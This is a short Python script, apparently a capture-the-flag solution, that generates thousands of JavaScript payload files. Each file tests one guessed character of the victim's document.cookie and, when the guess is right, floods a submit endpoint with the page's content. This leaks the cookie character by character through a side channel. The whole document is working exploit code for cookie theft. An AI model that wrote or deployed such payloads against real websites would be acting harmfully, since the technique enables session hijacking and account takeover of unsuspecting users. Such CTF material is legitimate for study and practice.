tpl = """

var pbody = JSON.stringify({"halloween_name":document.body.innerHTML,"email":"asd@asd.com","costume_type":"spellcaster","trick_or_treat":"treats"});
function pst(){fetch('/api/submit', {method: 'POST',headers:{'Content-Type':'application/json'}, body: pbody})}
var bi=0; function bk(){ for (bi;bi<10;bi++){ pst() }}

if (document.cookie[{{pos}}] == "{{chr}}") bk()
"""

MAX_LEN = 100
for i in range(MAX_LEN):
  for c in range(0x20,0x7f+1):
    cont = tpl.replace('{{pos}}', str(i)).replace('{{chr}}', chr(c))
    with open(f"bk_{i}_{c}.js","w") as f:
      f.write(cont)

